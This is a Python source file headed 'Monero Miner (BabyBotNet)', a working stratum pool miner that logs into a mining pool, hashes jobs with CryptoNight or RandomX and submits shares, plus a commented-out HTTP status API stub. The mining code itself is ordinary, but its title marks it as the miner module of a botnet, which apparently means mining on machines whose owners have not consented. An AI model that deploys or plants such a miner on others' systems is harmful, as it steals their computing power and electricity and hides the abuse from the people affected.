#!/usr/bin/python
"Monero Miner (BabyBotNet)"

import socket
import select
import binascii
import struct
import json
import sys
import os
import time
import threading
import subprocess
import multiprocessing

import pycryptonight
import pyrx


# main
class Miner(multiprocessing.Process):

    """
    Python based Monero miner. Based off of work in: https://github.com/jtgrassie/monero-powpy

    Utilizes a queue of jobs with a worker process to mine Monero.
    """

    def __init__(self, url, port, user):
        super(Miner, self).__init__()
        self.pool_host = url
        self.pool_port = port
        self.pool_pass = 'xx'
        self.user = user
        self.q = multiprocessing.Queue()
        self.s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.proc = threading.Thread(target=self.worker)
        self.hashrate = 0

    def run(self):
        pool_ip = socket.gethostbyname(self.pool_host)
        self.s.connect((pool_ip, self.pool_port))
        self.proc.daemon = True
        self.proc.start()

        login = {
            'method': 'login',
            'params': {
                'login': self.user,
                'pass': self.pool_pass,
                'rigid': '',
                'agent': 'stratum-miner-py/0.1'
            },
            'id':1
        }

        if '--debug' in sys.argv:
            print('Logging into pool: {}:{}'.format(self.pool_host, self.pool_port))
        self.s.sendall(str(json.dumps(login)+'\n').encode('utf-8'))

        try:
            while 1:
                line = self.s.makefile().readline()
                r = json.loads(line)
                error = r.get('error')
                result = r.get('result')
                method = r.get('method')
                params = r.get('params')
                if error and '--debug' in sys.argv:
                    print('Error: {}'.format(error))
                    continue
                if result and result.get('status') and '--debug' in sys.argv:
                    print('Status: {}'.format(result.get('status')))
                if result and result.get('job'):
                    login_id = result.get('id')
                    job = result.get('job')
                    job['login_id'] = login_id
                    self.q.put(job)
                elif method and method == 'job' and len(login_id):
                    self.q.put(params)
        except KeyboardInterrupt:
            try:
                self.s.close()
                self.terminate()
            except: pass


    def pack_nonce(self, blob, nonce):
        b = binascii.unhexlify(blob)
        bin = struct.pack('39B', *bytearray(b[:39]))
        bin += struct.pack('I', nonce)
        bin += struct.pack('{}B'.format(len(b)-43), *bytearray(b[43:]))
        return bin


    def worker(self):
        started = time.time()
        hash_count = 0

        while 1:
            job = self.q.get()
            if job.get('login_id'):
                login_id = job.get('login_id')
            blob = job.get('blob')
            target = job.get('target')
            job_id = job.get('job_id')
            height = job.get('height')
            block_major = int(blob[:2], 16)
            cnv = 0
            if block_major >= 7:
                cnv = block_major - 6
            if cnv > 5:
                seed_hash = binascii.unhexlify(job.get('seed_hash'))
                if '--debug' in sys.argv:
                    print('New job with target: {}, RandomX, height: {}'.format(target, height))
            else:
                if '--debug' in sys.argv:
                    print('New job with target: {}, CNv{}, height: {}'.format(target, cnv, height))
            target = struct.unpack('I', binascii.unhexlify(target))[0]
            if target >> 32 == 0:
                target = int(0xFFFFFFFFFFFFFFFF / int(0xFFFFFFFF / target))
            nonce = 1

            while 1:
                bin = self.pack_nonce(blob, nonce)
                if cnv > 5:
                    hash = pyrx.get_rx_hash(bin, seed_hash, height)
                else:
                    hash = pycryptonight.cn_slow_hash(bin, cnv, 0, height)
                hash_count += 1
                hex_hash = binascii.hexlify(hash).decode()
                r64 = struct.unpack('Q', hash[24:])[0]
                if r64 < target:
                    elapsed = time.time() - started
                    self.hashrate = int(hash_count / elapsed)
                    if '--debug' in sys.argv:
                        print('{}Hashrate: {} H/s'.format(os.linesep, self.hashrate))
                    submit = {
                        'method':'submit',
                        'params': {
                            'id': login_id,
                            'job_id': job_id,
                            'nonce': binascii.hexlify(struct.pack('<I', nonce)).decode(),
                            'result': hex_hash
                        },
                        'id':1
                    }
                    if '--debug' in sys.argv:
                        print('Submitting hash: {}'.format(hex_hash))
                    self.s.sendall(str(json.dumps(submit)+'\n').encode('utf-8'))
                    select.select([self.s], [], [], 3)
                    if not self.q.empty():
                        break
                nonce += 1


    def stop(self):
        try:
            self.s.close()
            self.terminate()
        except: pass

# TODO: API for Python miner (functional equivalent to XMRig API)

# class SummaryRequestHandler(BaseHTTPRequestHandler):
#     def _set_headers(self):
#         self.send_response(200)
#         self.send_header('Content-type', 'application/json')
#         self.end_headers()
        
#     def do_HEAD(self):
#         self._set_headers()
        
#     # GET sends back a Hello world message
#     def do_GET(self):
#         self._set_headers()
#         self.wfile.write(json.dumps({'hello': 'world', 'received': 'ok'}))
        
#     # POST echoes the message adding a JSON field
#     def do_POST(self):
#         ctype, pdict = cgi.parse_header(self.headers.getheader('content-type'))
        
#         # refuse to receive non-json content
#         if ctype != 'application/json':
#             self.send_response(400)
#             self.end_headers()
#             return
            
#         # read the message and convert it into a python dictionary
#         length = int(self.headers.getheader('content-length'))
#         message = json.loads(self.rfile.read(length))
        
#         # add a property to the object, just to mess with data
#         message['received'] = 'ok'
        
#         # send the message back
#         self._set_headers()
#         self.wfile.write(json.dumps(message))
        
# def run(server_class=HTTPServer, handler_class=SummaryRequestHandler, port=8888):
#     server_address = ('', port)
#     httpd = server_class(server_address, handler_class)
    
#     print 'Starting httpd on port %d...' % port
#     httpd.serve_forever()
